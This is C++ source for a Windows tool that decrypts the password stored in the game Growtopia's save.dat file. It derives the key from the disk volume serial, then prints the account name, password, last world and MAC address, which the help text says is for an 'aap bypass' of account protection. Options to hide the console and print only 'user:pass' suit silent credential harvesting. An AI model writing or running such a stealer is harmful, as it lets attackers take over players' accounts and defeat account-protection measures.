#pragma once
#include <WinSock2.h>
#include <Windows.h>
#include <iphlpapi.h>
#include <iostream>
#include <conio.h>
#include <string>
#include <cstdarg>
#include "proton/Variant.hpp"
#include "proton/vardb.h"
#include <sstream>
#include <stdlib.h>
#include <tchar.h>

#pragma comment(lib, "iphlpapi.lib")

unsigned int decrypt(byte* data, unsigned int size, int key)
{
	//src: proton
	unsigned int checksum = 0;
	for (unsigned int i = 0; i < size; i++)
	{
		checksum += data[i] + key + i;
		data[i] = data[i] - (2 + key + i);
	}
	return checksum;
}
uint32 hash_str(const char* str, int32 len)
{
	//src: proton
	if (!str) return 0;

	auto n = (unsigned char*)str;
	uint32 acc = 0x55555555;
	for (int32 i = 0; i < len; i++)
		acc = (acc >> 27) + (acc << 5) + *n++;

	return acc;
}
string get_identifier()
{
	//src: proton
	DWORD dwDiskSerial;
	if (!GetVolumeInformation(L"C:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
		if (!GetVolumeInformation(L"D:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
			if (!GetVolumeInformation(L"E:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
				if (!GetVolumeInformation(L"F:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
					if (!GetVolumeInformation(L"G:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
						return "";

	char stTemp[128];
	sprintf(stTemp, "%u", dwDiskSerial);
	return stTemp;
}
void rephelper(string& str, const string& from, const string& to) {
	if (from.empty())
		return;
	size_t start = 0;
	while ((start = str.find(from, start)) != -1) {
		str.replace(start, from.length(), to);
		start += to.length();
	}
}

static string get_mac() {
	IP_ADAPTER_ADDRESSES ainfo[64];
	DWORD len = sizeof(ainfo);
	auto status = GetAdaptersAddresses(2, 0, NULL, ainfo, &len);
	if (status == ERROR_BUFFER_OVERFLOW) //happened with 16 adapters for me but no1 should have over 64
		return "NOMAC";
	auto info = ainfo;
	while (info) {
		if (info->PhysicalAddressLength) {
			for (auto j = info->FirstUnicastAddress; j; j = j->Next) {
				if (j && (void*)&j->Address) {
					if (j->Address.lpSockaddr && j->Address.lpSockaddr->sa_family == 2) {
						auto address = info->PhysicalAddress;
						char buffer[18];
						sprintf_s(buffer, "%02X:%02X:%02X:%02X:%02X:%02X", address[0], address[1], address[2], address[3], address[4], address[5]);
						return string(buffer);
					}
				}
			}
		}
		info = info->Next;
	}
	return "NOMAC";
}

int _stdcall WinMain(struct HINSTANCE__* hinstance, struct HINSTANCE__* hprevinstance, char* cmdline, int cmdshow)
{
	bool set_visible = true;
	bool nowait = false, nolog = false, user = false, dump = false, custom_file = false, mac = false, world = false; //ghetto as fuck
	string custom_path{};
	stringstream help{};
	for (int i = 0; i < __argc; i++) {
		std::string arg(__argv[i]);
		if (arg == "-help") {
			help << "Supported arguments:" << endl;
			help << "-help.............well this command" << endl;
			help << "-hide.............no console" << endl;
			help << "-nowait...........doesnt wait for key press on exit" << endl;
			help << "-path=file........uses custom file path instead of gts default one" << endl;
			help << "-world............gets the last world of the user, if there is one specified. If not it prints NOWORLD" << endl
				<< "..................if nolog is specified it prints it after the password" << endl
				<< "..................if mac is specified on top of nolog, it prints it before mac" << endl;
			help << "-mac..............gets the mac address of the user that gt would use. its needed for aap bypass" << endl
				<< "..................if nolog is specified it appends after pass or user:pass with a newline inbetween." << endl;
			help << "-nolog............does not log anything except the password as output. (and username if the option is on)" << endl
				<< "..................if its not found it instead returns ERROR_TANKPW if tankid_password field is not found" << endl
				<< "..................if the input file is not found it instead returns ERROR_FILE." << endl;
			help << "-user.............prints the username before the password so its in the format user:pass" << endl
				<< "..................if tankid_username is not found, instead prints ERROR_NAME:pass" << endl;
			help << "-dump.............dumps all of the information saved on save.dat in their proper format." << endl << endl;
		}
		else if (arg == "-hide")
			set_visible = false;
		else if (arg == "-nowait")
			nowait = true;
		else if (arg == "-nolog")
			nolog = true;
		else if (arg == "-user")
			user = true;
		else if (arg == "-dump")
			dump = true;
		else if (arg == "-mac")
			mac = true;
		else if (arg == "-world")
			world = true;
		else if (arg.find("-path=") != -1) {
			auto copy = arg;
			rephelper(copy, "-path=", "");
			custom_file = true;
			custom_path = copy;
		}
	}
	if (set_visible) {
		AllocConsole();
		freopen("conin$", "r", stdin);
		freopen("conout$", "w", stdout);
		freopen("conout$", "w", stderr);
		printf("%s", help.str().c_str());
	}

	if (!nolog) {
		printf("Proper save.dat password decrypter by ama\n");
		printf("-help argument for extended information about supported arguments.\n");
		printf("Only works if save.dat is from the same machine as the decrypter is ran on\n");
	}

	VariantDB db{};
	bool did_exist;
	auto path = (string)getenv("LOCALAPPDATA") + "\\Growtopia\\save.dat";
	if (custom_file)
		path = custom_path;

	auto success = db.Load(path, &did_exist);
	if (success && did_exist) {
		if (!nolog)
			printf("Found save.dat\n");
		auto variant = db.GetVarIfExists("tankid_password");
		if (variant) {
			auto varstr = variant->get_h();
			auto size = varstr.length();
			auto pass = new uint8_t[size];
			memcpy(pass, varstr.data(), size);
			auto device_id = get_identifier();
			auto output = decrypt(pass, size, hash_str(device_id.c_str(), device_id.length()));
			auto pass_str = (string)(char*)(&*(DWORD**)pass); //very likely unsafe
			delete[] pass;
			pass_str.resize(size);

			auto uservar = db.GetVarIfExists("tankid_name");
			if (user && uservar)
				printf("%s:", uservar->get_h().c_str());
			else if (user)
				printf("ERROR_NAME:");
			if (nolog)
				printf("%s", pass_str.c_str());
			else
				printf("pass is: %s\n", pass_str.c_str());

			if (world) {
				auto worldvar = db.GetVarIfExists("lastworld");
				if (worldvar) {
					auto worldstr = worldvar->get_h();
					if (nolog)
						printf("\n%s", worldstr.c_str());
					else
						printf("World: %s", worldstr.c_str());
				}
				else printf("\nNOWORLD");
			}

			if (nolog && mac)
				printf("\n%s", get_mac().c_str());
			else if (mac)
				printf("Mac address (for AAP): %s", get_mac().c_str());

			if (dump) {
				variant->Set(pass_str);
				printf("%s\n", db.DumpAsString().c_str());
			}
		}
		else if (!nolog)
			printf("Tankid password field not found.\n");
		else
			printf("ERROR_TANKPW");
	}
	else if (!nolog)
		printf("Did not find save.dat at %s or could not load it for unknown reasons.\n", path.c_str());
	else
		printf("ERROR_FILE");

	if (!nowait)
		(void)_getch();
	return 0;
}
